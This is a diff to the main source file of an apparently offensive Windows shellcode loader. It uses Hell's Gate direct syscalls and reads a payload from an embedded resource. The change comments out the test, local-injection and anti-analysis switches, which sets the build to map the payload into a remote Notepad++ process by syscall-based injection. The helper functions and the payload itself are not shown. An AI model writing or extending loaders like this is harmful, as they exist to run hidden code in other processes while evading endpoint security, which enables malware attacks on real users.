@@ -1,15 +1,15 @@
 #include "HellsGate.h"
 #include "Common.h"
 
-#define TEST
+//#define TEST
 
-#define LOCAL_INJECTION
+//#define LOCAL_INJECTION
 
 #ifndef LOCAL_INJECTION
 #define TARGET_PROCESS L"Notepad++.exe"
 #endif
 
-#define ANTI_ANALYSIS
+//#define ANTI_ANALYSIS
 
 int main() {
 	// Init syscalls for use
@@ -19,7 +19,7 @@ int main() {
 	}
 
 	// Load user32.dll for use
-	LoadLibraryA("User32.dll");
+	LoadLibraryA("user32.dll");
 
 	// Init WinApis for use
 	if (InitializeWinApis() == FALSE) {
@@ -44,11 +44,11 @@ int main() {
 #endif
 
 	// Resource reading
-	if (ReadPayloadFromResource(&pPayloadAddress, &sPayloadSize) != TRUE) {
-		printf("[!] Failed To Read Payload From The Resource\n");
+	if (LoadPayloadFromResource(&pPayloadAddress, &sPayloadSize) != TRUE) {
+		printf("[!] Failed To Load Payload From The Resource\n");
 		return -1;
 	}
-	printf("[+] Read Payload To: %p Address Of Size: %d\n", pPayloadAddress, (INT)sPayloadSize);
+	printf("[+] Load Payload To: %p Address Of Size: %d\n", pPayloadAddress, (INT)sPayloadSize);
 	PrintHexData("ResourcePayload", pPayloadAddress, sPayloadSize);
 #ifdef LOCAL_INJECTION
 	RemoteMappingInjectionViaSyscalls(
@@ -64,7 +64,6 @@ int main() {
 		wprintf(L"[!] Failed To Find Target Process %ls\n", TARGET_PROCESS);
 		return -1;
 	}
-	printf("[+] DONE!\n");
 	wprintf(L"[+] Found Taget Process: %ls with PID: %d And Handle: %p!\n", TARGET_PROCESS, dwPid, hProcess);
 
 	RemoteMappingInjectionViaSyscalls(
